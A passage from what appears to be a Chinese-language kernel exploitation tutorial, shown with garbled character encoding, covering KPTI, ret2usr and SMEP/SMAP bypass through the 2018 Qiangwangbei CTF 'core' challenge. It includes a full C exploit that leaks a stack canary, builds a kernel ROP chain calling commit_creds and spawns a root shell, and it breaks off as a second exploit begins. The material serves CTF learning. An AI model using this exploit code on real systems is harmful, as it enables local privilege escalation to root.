<p>åœ¨ 64 ä½ä¸‹ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´éƒ½å  128 TBï¼Œæ‰€ä»¥ä»–ä»¬å ç”¨çš„é¡µå…¨å±€è¡¨é¡¹ï¼ˆPGDï¼‰çš„å¤§å°åº”å½“æ˜¯ç›¸åŒçš„ï¼Œå›¾ä¸Šæ²¡æœ‰ä½“ç°å‡ºæ¥ï¼Œå› æ­¤è¿™é‡Œç”±ç¬”è€…ä»£ä¸ºè¡¥å……è¯´æ˜ï¼ˆç¬‘ï¼‰</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/03/11/q74X6lbTnrNGhC1.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>ç¬”è€…ä»¥å‰å­¦ä¹  KPTI æ—¶çœ‹äº†ä¸€ç¯‡æŸä¹ä¸Šçš„æ–‡ç« è¯´æ˜¯ç”¨æˆ·ç©ºé—´ä¸€å¼ é¡µè¡¨ï¼Œå†…æ ¸ç©ºé—´ä¸€å¼ é¡µè¡¨ï¼Œ<strong>å®ç°å®Œæ•´çš„éš”ç¦»</strong>ï¼Œç¬”è€…ä¸€åº¦ä¿¡ä»¥ä¸ºçœŸï¼Œåé¢æƒ³æƒ³ä¸å¯¹åŠ²ï¼Œ<strong>å¦‚æœç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çœŸæ˜¯å®Œå…¨éš”ç¦»çš„è¯ä»–ä»¬ä¹‹é—´ç”šè‡³æ— æ³•è¿›è¡Œæ•°æ®äº¤æ¢ï¼Œå› æ­¤å¿…å®šåœ¨æŸä¸ªèŠ‚ç‚¹ä¸ŠåŒæ—¶å­˜åœ¨ç€å®Œæ•´çš„å¯¹ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„æ˜ å°„</strong>ï¼Œè¿™ä¸ªèŠ‚ç‚¹å°±æ˜¯å½“ CPU è¿è¡Œåœ¨å†…æ ¸æ€æ—¶</p>
</blockquote>
<p>é™¤äº†åœ¨ç³»ç»Ÿè°ƒç”¨å…¥å£ä¸­å°†ç”¨æˆ·æ€é¡µè¡¨åˆ‡æ¢åˆ°å†…æ ¸æ€é¡µè¡¨çš„ä»£ç å¤–ï¼Œå†…æ ¸ä¹Ÿç›¸åº”åœ°åœ¨ <code>arch/x86/entry/entry_64.S</code> ä¸­æä¾›äº†ä¸€ä¸ªç”¨äºå®Œæˆå†…æ ¸æ€é¡µè¡¨åˆ‡æ¢å›åˆ°ç”¨æˆ·æ€é¡µè¡¨çš„å‡½æ•° <code>swapgs_restore_regs_and_return_to_usermode</code>ï¼Œåœ°å€å¯ä»¥åœ¨ <code>/proc/kallsyms</code> ä¸­è·å¾—</p>
<p>æºç çš„ AT&amp;T æ±‡ç¼–æ¯”è¾ƒåäººç±»ï¼Œæ¨èç›´æ¥æŸ¥çœ‹ IDA çš„åæ±‡ç¼–ç»“æœï¼ˆäº²åˆ‡çš„ Intel é£æ ¼ï¼‰ï¼š</p>
<p><img src="https://i.loli.net/2021/09/10/FpymLdwJMnRU4hi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨å®é™…æ“ä½œæ—¶å‰é¢çš„ä¸€äº›æ ˆæ“ä½œéƒ½å¯ä»¥è·³è¿‡ï¼Œç›´æ¥ä» <code>mov rdi, rsp</code> å¼€å§‹ï¼Œè¿™ä¸ªå‡½æ•°å¤§æ¦‚å¯ä»¥æ€»ç»“ä¸ºå¦‚ä¸‹æ“ä½œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov  rdi, cr3<br>or rdi, 0x1000<br>mov  cr3, rdi<br>pop rax<br>pop rdi<br>swapgs<br>iretq<br></code></pre></td></tr></table></figure>

<p>å› æ­¤æˆ‘ä»¬åªéœ€è¦å¸ƒç½®å‡ºå¦‚ä¸‹æ ˆå¸ƒå±€å³å¯ï¼š</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">â†“   swapgs_restore_regs_and_return_to_usermode<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    user_shell_addr<br>    user_cs<br>    user_rflags<br>    user_sp<br>    user_ss<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åŒæ—¶ä¹Ÿå¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªæå¥½çš„ç”¨æ¥è¿›è¡Œè°ƒæ ˆçš„å‡½æ•°</p>
<blockquote>
<p>KPTI bypass è¿™é‡Œå°±ä¸æ”¾ä¾‹é¢˜äº†ï¼Œå› ä¸ºå’Œå‰é¢çš„è¿”å›ç”¨æˆ·æ€è€Œè¨€ä»…æœ‰ gadget ä»¥åŠæ ˆå¸ƒå±€ä¸Šçš„å¾®å°å·®åˆ«</p>
</blockquote>
<h1 id="0x02-Kernel-ROP-ret2usr"><a href="#0x02-Kernel-ROP-ret2usr" class="headerlink" title="0x02.Kernel ROP - ret2usr"></a>0x02.Kernel ROP - ret2usr</h1><p><strong>åœ¨ã€æœªã€‘å¼€å¯SMAP&#x2F;SMEPä¿æŠ¤çš„æƒ…å†µä¸‹</strong>ï¼Œç”¨æˆ·ç©ºé—´æ— æ³•è®¿é—®å†…æ ¸ç©ºé—´çš„æ•°æ®ï¼Œä½†æ˜¯å†…æ ¸ç©ºé—´å¯ä»¥è®¿é—®&#x2F;æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼Œå› æ­¤ ret2usr è¿™ç§æ”»å‡»æ‰‹æ³•åº”è¿è€Œç”Ÿâ€”â€”é€šè¿‡ kernel ROP ä»¥å†…æ ¸çš„ ring 0 æƒé™æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ä»¥å®Œæˆææƒ</p>
<p>é€šå¸¸ CTF ä¸­çš„ ret2usr è¿˜æ˜¯ä»¥æ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(NULL))</code>è¿›è¡Œææƒä¸ºä¸»è¦çš„æ”»å‡»æ‰‹æ³•ï¼Œä¸è¿‡ç›¸æ¯”èµ·æ„é€ å†—é•¿çš„ROP chainï¼Œret2usr åªéœ€æˆ‘ä»¬è¦æå‰åœ¨ç”¨æˆ·æ€ç¨‹åºæ„é€ å¥½å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆã€è·å–ç›¸åº”å‡½æ•°åœ°å€åç›´æ¥ ret å›åˆ°ç”¨æˆ·ç©ºé—´æ‰§è¡Œå³å¯</p>
<p>âœ³ å¯¹äºå¼€å¯äº†<code>SMAP/SMEPä¿æŠ¤</code>çš„ kernel è€Œè¨€ï¼Œ<strong>å†…æ ¸ç©ºé—´å°è¯•ç›´æ¥è®¿é—®ç”¨æˆ·ç©ºé—´ä¼šå¼•èµ· kernel panic</strong></p>
<blockquote>
<p>é€šå¸¸æƒ…å†µä¸‹çš„æŠ¥é”™ä¿¡æ¯å¤§æ¦‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[    7.168919] unable to execute userspace code (SMEP?) (uid: 1000)<br>[    7.170547] BUG: unable to handle kernel paging request at 0000000000401d8a<br>[    7.171399] IP: 0x401d8a<br>[    7.171598] PGD 800000000fb5e067 P4D 800000000fb5e067 PUD fb5f067 PMD fb59065<br>[    7.172087] Oops: 0011 [#1] SMP PTI<br>// è°ƒç”¨æ ˆå›æº¯<br>[    7.186319] Kernel panic - not syncing: Fatal exception<br>[    7.187391] Kernel Offset: 0x32800000 from 0xffffffff81000000 (relocation ra)<br>[    7.188504] Rebooting in 1 seconds.. <br></code></pre></td></tr></table></figure>
</blockquote>
<h3 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core-1"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core-1" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core</h3><blockquote>
<p>å¥½åƒä¹Ÿæ‰¾ä¸åˆ°åˆ«çš„çº¯ ret2usr çš„é¢˜äº†ï¼Œkernel pwn çš„é¢˜å¤ªå°‘äº†â€¦<del>ä½†æ˜¯ä½ åˆâ‘§èƒ½â‘§å­¦</del></p>
</blockquote>
<p>å…·ä½“çš„è¿™é‡Œå°±ä¸å†é‡å¤åˆ†æäº†ï¼Œç”±äºå…¶æœªå¼€å¯ smap&#x2F;smep ä¿æŠ¤ï¼Œæ•…å¯ä»¥è€ƒè™‘åœ¨<strong>ç”¨æˆ·åœ°å€ç©ºé—´ä¸­æ„é€ å¥½å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆåç›´æ¥ ret2usr ä»¥ææƒ</strong>ï¼Œæˆ‘ä»¬åªéœ€è¦å°†ä»£ç ç¨åŠ ä¿®æ”¹å³å¯</p>
<p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  IRETQ 0xffffffff813eb448</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">coreRead</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setOffValue</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-type">size_t</span> canary;<br>    setOffValue(fd, <span class="hljs-number">64</span>);<br>    coreRead(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)getRootPrivilige;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é‡æ–°æ‰“åŒ…ï¼Œè¿è¡Œï¼ŒæˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://i.loli.net/2021/03/10/ZJr5aWSmlBM8AXt.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="ret2usr-with-SMAP-x2F-SMEP-BYPASS"><a href="#ret2usr-with-SMAP-x2F-SMEP-BYPASS" class="headerlink" title="ret2usr with SMAP&#x2F;SMEP BYPASS"></a>ret2usr with SMAP&#x2F;SMEP BYPASS</h2><p>å‰é¢æˆ‘ä»¬è®²åˆ°ï¼Œå½“ kernel å¼€å¯ SMEP ä¿æŠ¤æ—¶ï¼Œret2usr è¿™ç§æ”»å‡»æ‰‹æ³•å°†ä¼šå¼•èµ· kernel panicï¼Œå› æ­¤è‹¥æ˜¯æˆ‘ä»¬ä»ç„¶æƒ³è¦è¿›è¡Œ ret2usr æ”»å‡»ï¼Œåˆ™éœ€è¦å…ˆå…³é—­ SMEP ä¿æŠ¤</p>
<p>Intel ä¸‹ç³»ç»Ÿæ ¹æ® CR4 æ§åˆ¶å¯„å­˜å™¨çš„ç¬¬ 20ã€21 ä½æ ‡è¯†æ˜¯å¦å¼€å¯ SMEPã€SMAP ä¿æŠ¤ï¼ˆ1ä¸ºå¼€å¯ï¼Œ0ä¸ºå…³é—­ï¼‰ï¼Œ<strong>è‹¥æ˜¯èƒ½å¤Ÿæ”¹å˜ CR4 å¯„å­˜å™¨çš„å€¼ä¾¿èƒ½å¤Ÿå…³é—­ SMEP&#x2F;SMAP ä¿æŠ¤</strong>ï¼Œå®Œæˆ SMAP&#x2F;SMEP-bypassï¼Œæ¥ä¸‹æ¥å°±èƒ½å¤Ÿé‡æ–°è¿›è¡Œ ret2usr</p>
<p><img src="https://i.loli.net/2021/09/07/sYFKuZiUVNIclBp.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹CPUç›¸å…³ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬å¼€å¯çš„ä¿æŠ¤ç±»å‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /proc/cpuinfo</span><br></code></pre></td></tr></table></figure>

<h3 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core-2"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core-2" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core</h3><blockquote>
<p><del>åˆæ˜¯ coreï¼å…¸ä¸­å…¸çš„ kernel pwn å…¥é—¨é¢˜ï¼</del></p>
</blockquote>
<p>è¿™ä¸€æ¬¡æˆ‘ä»¬åœ¨å¯åŠ¨è„šæœ¬ä¸­æ·»åŠ ä¸Š smep ä¸ smap çš„é€‰é¡¹ï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">qemu-system-x86_64 \<br>-m 128M \<br>-cpu qemu64-v1,+smep,+smap \<br>-kernel ./bzImage \<br>-initrd  ./rootfs.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>-s  \<br>-netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘ä»¬é‡æ–°è¿è¡Œä¹‹å‰çš„ ret2usr çš„ expï¼Œå‘ç°ç›´æ¥ kernel panic äº†ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„å‡½æ•°æŒ‡é’ˆï¼Œè§¦å‘äº† SMEP ä¿æŠ¤</p>
<p><img src="https://s2.loli.net/2022/05/07/f2MXaqwC7kgRx8G.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡ ROP æ¥å…³é—­ SMEP&amp;SMAP å³å¯ç»§ç»­ ret2usrï¼Œè¿™é‡Œç¬”è€…ç”¨ä¸è¿ç®—å°† SMEP ä¸ SMAP çš„ä¸¤ä½ç»™æ¸…é™¤æ‰äº†ï¼Œå®é™…ä¸Šç›´æ¥ç»™ cr4 èµ‹å€¼ <code>0x6f0</code> ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆé€šå¸¸å…³äº†ä»¥åéƒ½æ˜¯è¿™ä¸ªå€¼ï¼‰</p>
<p>å‰é¢æˆ‘ä»¬ä½¿ç”¨ swapgs å’Œ iret ä¸¤æ¡æŒ‡ä»¤æ¥è¿”å›ç”¨æˆ·æ€ï¼Œè¿™ä¸€æ¬¡æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ <code>swapgs_restore_regs_and_return_to_usermode</code> æ¥è¿”å›ç”¨æˆ·æ€</p>
<p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs 